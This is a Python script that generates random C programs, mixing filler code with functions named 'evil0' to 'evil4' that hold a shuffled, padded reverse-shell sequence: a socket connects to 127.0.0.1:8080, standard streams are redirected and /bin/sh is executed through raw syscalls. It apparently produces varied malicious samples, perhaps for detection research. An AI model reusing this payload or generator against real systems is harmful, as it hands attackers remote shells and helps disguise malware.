#!/usr/bin/env python
__author__ = "stdlib.h (@r888800009), Tomy Hsieh (@tomy0000000)"
__credits__ = ["stdlib.h", "Tomy Hsieh"]
__license__ = "MIT"

import random
import re

BUFFER = ""

open_file_seq = [
    '  %replace_val_name = fopen("/tmp/flag.txt", "w");',
    "  fclose(%replace_val_name);",
]

exp_seq = [
    """
  int scktd;
  struct sockaddr_in client;
""",
    """
  client.sin_family = AF_INET;
  client.sin_addr.s_addr = inet_addr("127.0.0.1");
  client.sin_port = htons(8080);
""",
    """
  scktd = syscall(41,2,1,0);
""",
    """
  connect(scktd,(struct sockaddr *)&client,sizeof(client));
""",
    """
  dup2(scktd,0); // STDIN
  dup2(scktd,1); // STDOUT
  dup2(scktd,2); // STDERR
""",
    """
  syscall(59,"/bin/sh",NULL,NULL);
""",
]

tcp_seq = [
    """
  int scktd;
  struct sockaddr_in client;
""",
    """
  client.sin_family = AF_INET;
  client.sin_addr.s_addr = inet_addr("127.0.0.1");
  client.sin_port = htons(8080);
""",
    """
  scktd = syscall(41,2,1,0);
""",
    """
  connect(scktd,(struct sockaddr *)&client,sizeof(client));
""",
    """
  dup2(scktd,0); // STDIN
  dup2(scktd,1); // STDOUT
  dup2(scktd,2); // STDERR
""",
    """
  syscall(59,"/bin/echo",NULL,NULL);
""",
]

exp_seq_args = [
    "",
    "struct sockaddr_in client",
]

exp_seq_ret = []


def gen_access_file(max_deep, cur_deep):
    if max_deep <= cur_deep:
        return ""
    # print_buffer(code_block(max_deep, 0))
    name = def_var_type("FILE*", "file_")
    ret = "  " * cur_deep + "FILE* " + name + ";\n"
    ret += code_block(max_deep, cur_deep)
    ret += seq_to_code(open_file_seq).replace("%replace_val_name", name) + "\n"
    ret += code_block(max_deep, cur_deep)
    return ret
    # print_buffer(seq_to_code(exp_seq))


def density_decreased(codeblock):
    codeblock = codeblock.split("\n")
    ret = ""
    max_deep = random.randint(1, 2)
    for line in codeblock:
        if line.strip() == "":
            continue
        ret += code_block(max_deep, 0)
        ret += line + "\n"
    return ret


def seq_to_code(exp_seq):
    ret = ""
    for block in exp_seq:
        block = block.split("\n")
        random.shuffle(block)
        ret += "\n".join(block) + "\n"
    return ret


defined_var = {}
var_count = 0
scope = 0


def clear_var():
    global defined_var, var_count, scope
    defined_var = {}
    var_count = 0
    scope = 0


def def_var_type(set_type, prefix=""):
    global var_count
    name = prefix + "var" + str(var_count)
    var_count += 1
    defined_var[name] = scope
    return name


def gen_def_int(cur_deep):
    set_type = "int"
    init = random.randint(-100, 100)
    return (
        "  " * cur_deep
        + set_type
        + " "
        + def_var_type(set_type)
        + " = {};\n".format(init)
    )


def check_and_gen(max_deep, cur_deep):
    if not get_only_int():
        return gen_def_var(max_deep, cur_deep)
    return ""


def get_only_int():
    filered = list(defined_var.keys())
    filered = [var for var in filered if not re.search(r"file", var)]
    return filered


def get_int_name():
    return random.choice(get_only_int())


def gen_def_var(max_deep, cur_deep):
    return gen_def_int(cur_deep)


def gen_assign_var(max_deep, cur_deep):
    ret = check_and_gen(max_deep, cur_deep)
    name = get_int_name()

    if random.choice([True, False]):
        init = random.randint(-100, 100)
        ret += "  " * cur_deep + "{} = {};\n".format(name, init)
    elif random.choice([True, False]):
        ret += "  " * cur_deep + 'scanf("%d", &{});\n'.format(name)
    else:
        ret += "  " * cur_deep + 'printf("%d", {});\n'.format(name)

    return ret


def scope_push():
    global scope
    scope += 1


def scope_pop():
    global scope
    scope -= 1
    for key in list(defined_var.keys()):
        if defined_var[key] > scope:
            del defined_var[key]


def code_block(max_deep, cur_deep, buk=False):
    global scope
    ret = ""
    if buk:
        scope_push()
        ret = "  " * cur_deep + "{\n"

    for count in range(random.randint(1, 3)):
        root_code = get_random_func()
        ret += root_code(max_deep, cur_deep + 1)

    if buk:
        scope_pop()
        ret += "  " * cur_deep + "}\n\n"
    assert ret is not None
    return ret


def condition_gen(a, b):
    opr = random.choice(["==", "!=", ">=", "<=", ">", "<"])
    return "{} {} {}".format(a, opr, b)


def if_gen(max_deep, cur_deep):
    if max_deep <= cur_deep:
        return ""
    ret = check_and_gen(max_deep, cur_deep)
    name = get_int_name()
    init = random.randint(-100, 100)

    ret += "  " * cur_deep + 'scanf("%d", &{});\n'.format(name)
    ret += "  " * cur_deep + "if ({})\n".format(condition_gen(name, init))
    ret += code_block(max_deep, cur_deep, True)

    has_else = random.choice([True, False])
    if not has_else:
        return ret

    ret += "  " * cur_deep + "else\n"
    ret += code_block(max_deep, cur_deep, True)
    return ret


def while_gen(max_deep, cur_deep):
    if max_deep <= cur_deep:
        return ""
    print_buffer("  " * cur_deep + "while ()")
    code_block(max_deep, cur_deep)


def for_gen(max_deep, cur_deep):
    if max_deep <= cur_deep:
        return ""
    print_buffer("  " * cur_deep + "for ()")
    code_block(max_deep, cur_deep)


def get_random_func():
    funcs = [gen_call_var, if_gen, gen_def_var, gen_assign_var, gen_access_file]
    select = random.choice(funcs)
    return select


def header():
    print_buffer("#include <stdio.h>")
    print_buffer("#include <stdlib.h>")
    print_buffer("#include <unistd.h>")
    print_buffer("#include <sys/socket.h>")
    print_buffer("#include <arpa/inet.h>")


func_name_count = 0


def random_gen_func():
    global func_name_count
    gen_func("func{}".format(func_name_count), "int")
    func_name_count += 1


cur_func_deep = 0
defined_func = []


def gen_call_var(max_deep, cur_deep):
    calls = [
        'system("echo hi")',
        'system("echo 127.0.0.1")',
        'system("echo 8080")',
        'puts("hello world")',
        'puts("nc")',
        # 'execl("/bin/echo","echo","123",NULL,NULL);',
    ]

    if defined_func:
        for func in defined_func:
            if cur_func_deep < func["deep"]:
                calls.append("{}()".format(func["name"]))

    return "  " * cur_deep + random.choice(calls) + ";\n"


def def_func_discription(name, main_func):
    if not main_func:
        global cur_func_deep
        cur_func_deep = random.randint(2, 10)
        cur_func = {"name": name, "deep": cur_func_deep}
        defined_func.append(cur_func)


def gen_func_from_seq(func_name, ret_type, seq, main_func=False):
    def_func_discription(func_name, main_func)
    print_buffer("{} {}() {{".format(ret_type, func_name))
    scope_push()
    root_code = get_random_func()
    max_deep = random.randint(1, 5)
    # print_buffer(code_block(max_deep, 0))
    print_buffer(density_decreased(seq_to_code(seq)))
    # print_buffer(seq_to_code(exp_seq))
    scope_pop()
    print_buffer("}")


def gen_func_from_seq_nopadding(func_name, ret_type, seq, main_func=False):
    def_func_discription(func_name, main_func)
    print_buffer("{} {}() {{".format(ret_type, func_name))
    scope_push()
    root_code = get_random_func()
    max_deep = random.randint(1, 5)
    print_buffer(seq_to_code(seq))
    scope_pop()
    print_buffer("}")


def gen_func(func_name, ret_type, main_func=False):
    def_func_discription(func_name, main_func)
    print_buffer("{} {}() {{".format(ret_type, func_name))
    scope_push()
    root_code = get_random_func()
    max_deep = random.randint(1, 2)
    for i in range(11):
        print_buffer(code_block(max_deep, 0))
    # print_buffer(seq_to_code(exp_seq))
    scope_pop()
    print_buffer("}\n")


def print_buffer(content):
    global BUFFER
    BUFFER += f"{content}\n"


def clear_buffer():
    global BUFFER
    BUFFER = ""


def main():
    header()
    for i in range(20):
        random_gen_func()

    # gen_func_from_seq('main', 'int', exp_seq, True)

    for i in range(5):
        gen_func_from_seq("evil{}".format(i), "int", exp_seq)

    # for i in range(20):
    #    gen_func_from_seq('open_tcp{}'.format(i), 'int', tcp_seq)

    gen_func("main", "int", True)

    return BUFFER


if __name__ == "__main__":
    print(main())
